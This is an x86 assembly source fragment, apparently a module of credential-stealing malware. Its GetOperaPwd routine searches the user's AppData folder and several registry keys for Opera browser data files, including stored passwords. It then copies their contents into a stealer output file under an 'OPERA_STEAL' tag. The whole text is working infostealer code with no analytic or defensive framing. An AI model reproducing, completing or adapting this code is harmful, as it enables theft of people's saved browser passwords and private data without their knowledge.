.data?
      OperaBuf1     db  400h dup (?)
     
.code

GetOperaDataz proc path:DWORD
      push    offset OperaBuf1
      call    dword ptr [_PathAddBackslash]
      lstrcat, addr OperaBuf1, path
      
      invoke  MapFile, addr OperaBuf1, addr mfile, MAP_FILE_A
      test    eax, eax
      je      o_nofile
      
      add     dword ptr [DataSize], sizeof mfile.dwFileSize
      WriteFile, stfile, addr mfile.dwFileSize, sizeof mfile.dwFileSize, addr SNW, NULL
      mov     eax, dword ptr [mfile.dwFileSize]
      add     dword ptr [DataSize], eax
      WriteFile, stfile, mfile.lpMem, mfile.dwFileSize, addr SNW, NULL
      
      invoke  UnmapFile, addr mfile
      
    o_nofile:
      ret
GetOperaDataz endp

GetOperaPwd proc
      LOCAL   WTF:DWORD
      mov     dword ptr [DataSize], 0
      mov     dword ptr [stbuf], OPERA_STEAL
      WriteFile, stfile, addr stbuf, sizeof stbuf, addr SNW, NULL
      
      push    offset stealer_seh_proc
      assume  fs : nothing
      push    dword ptr fs:[0]
      mov     dword ptr fs:[0], esp
      mov     eax, offset GetOperaPwd_seh
      mov     seh.SafeEip, eax
      mov     seh.PrevEbp, ebp
      mov     seh.PrevEsp, esp
      SetFilePointer, stfile, 0, 0, FILE_CURRENT
      mov     dword ptr [savedfilepointer], eax
      
      mov     byte ptr [OperaBuf1], 0
      push    0
      push    CSIDL_APPDATA
      push    offset OperaBuf1
      push    0
      call    dword ptr [_SHGetSpecialFolderPath]
      push    offset OperaPath1
      call    GetOperaDataz
      
      mov     byte ptr [OperaBuf1], 0
      push    0
      push    CSIDL_APPDATA
      push    offset OperaBuf1
      push    0
      call    dword ptr [_SHGetSpecialFolderPath]
      push    offset OperaPath1_2
      call    GetOperaDataz
      
      invoke  RegRead, HKEY_LOCAL_MACHINE, addr OperaReg1, addr OperaReg2, addr OperaBuf1, sizeof OperaBuf1, REG_READ_A
      push    offset OperaPath2
      call    GetOperaDataz
      
      invoke  RegRead, HKEY_CURRENT_USER, addr OperaReg1, addr OperaReg2, addr OperaBuf1, sizeof OperaBuf1, REG_READ_A
      push    offset OperaPath2
      call    GetOperaDataz
      
      invoke  RegRead, HKEY_LOCAL_MACHINE, addr OperaReg1, addr OperaReg3, addr OperaBuf1, sizeof OperaBuf1, REG_READ_A
      push    offset OperaPath2
      call    GetOperaDataz
      
      invoke  RegRead, HKEY_CURRENT_USER, addr OperaReg1, addr OperaReg3, addr OperaBuf1, sizeof OperaBuf1, REG_READ_A
      push    offset OperaPath2
      call    GetOperaDataz
      
      invoke  RegRead, HKEY_LOCAL_MACHINE, addr OperaReg1, addr OperaReg4, addr OperaBuf1, sizeof OperaBuf1, REG_READ_A
      push    offset OperaPath2
      call    GetOperaDataz
      
      invoke  RegRead, HKEY_CURRENT_USER, addr OperaReg1, addr OperaReg4, addr OperaBuf1, sizeof OperaBuf1, REG_READ_A
      push    offset OperaPath2
      call    GetOperaDataz
      
    GetOperaPwd_seh:
      pop     dword ptr fs:[0]
      add     esp, 4
      
      WriteFile, stfile, addr DataSize, sizeof DataSize, addr SNW, NULL
      mov     eax, dword ptr [DataSize] ; return actual size of written data
      ret
GetOperaPwd endp
